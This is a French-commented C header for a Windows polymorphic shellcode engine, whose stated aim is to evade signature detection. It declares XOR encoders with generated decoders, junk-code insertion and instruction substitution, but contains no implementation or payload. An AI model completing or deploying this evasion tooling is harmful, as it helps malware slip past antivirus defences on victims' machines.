/*
 * polymorph.h - Génération de code polymorphique
 *
 * Crée des versions uniques du shellcode à chaque exécution
 * pour éviter la détection par signature
 *
 * Chaque appel à Poly_Generate() produit un résultat différent
 */

#ifndef POLYMORPH_H
#define POLYMORPH_H

#include <windows.h>

/* =========================================================================
 * Encodeurs
 * ========================================================================= */

/* Encode avec XOR simple (clé 1 byte) + décodeur auto-généré */
BOOL Poly_XOREncode(BYTE* shellcode, DWORD shellcodeSize,
                    BYTE** outEncoded, DWORD* outSize);

/* Encode avec XOR multi-byte (clé jusqu'à 16 bytes) */
BOOL Poly_MultiXOREncode(BYTE* shellcode, DWORD shellcodeSize,
                         DWORD keySize, BYTE** outEncoded, DWORD* outSize);

/* =========================================================================
 * Junk Code
 * ========================================================================= */

/* Génère du junk code aléatoire */
DWORD Poly_GenerateJunk(BYTE* buffer, DWORD maxSize);

/* Insère du junk dans un shellcode */
BOOL Poly_InsertJunk(BYTE* shellcode, DWORD shellcodeSize,
                     DWORD junkFrequency, BYTE** outResult, DWORD* outSize);

/* =========================================================================
 * Substitution d'instructions
 * ========================================================================= */

/* Remplace des instructions par des équivalents */
BOOL Poly_SubstituteInstructions(BYTE* shellcode, DWORD shellcodeSize,
                                  BYTE** outResult, DWORD* outSize);

/* =========================================================================
 * Génération complète
 * ========================================================================= */

/* Options de génération */
typedef struct {
    BOOL useXOREncoding;        /* Activer l'encodage XOR */
    BOOL useMultiByteKey;       /* Utiliser une clé multi-byte */
    DWORD keySize;              /* Taille de la clé (1-16) */
    BOOL insertJunk;            /* Insérer du junk code */
    DWORD junkFrequency;        /* Fréquence d'insertion (tous les N bytes) */
    BOOL substituteInstructions;/* Substituer les instructions */
} POLY_OPTIONS;

/* Génère une version polymorphique */
BOOL Poly_Generate(BYTE* shellcode, DWORD shellcodeSize,
                   POLY_OPTIONS* options, BYTE** outResult, DWORD* outSize);

/* =========================================================================
 * Utilitaires
 * ========================================================================= */

/* Libère la mémoire */
void Poly_Free(BYTE* buffer);

/* Options par défaut */
void Poly_GetDefaultOptions(POLY_OPTIONS* options);

/* Stats de génération en JSON */
BOOL Poly_GetStats(DWORD originalSize, DWORD encodedSize, char** outJson);

#endif /* POLYMORPH_H */
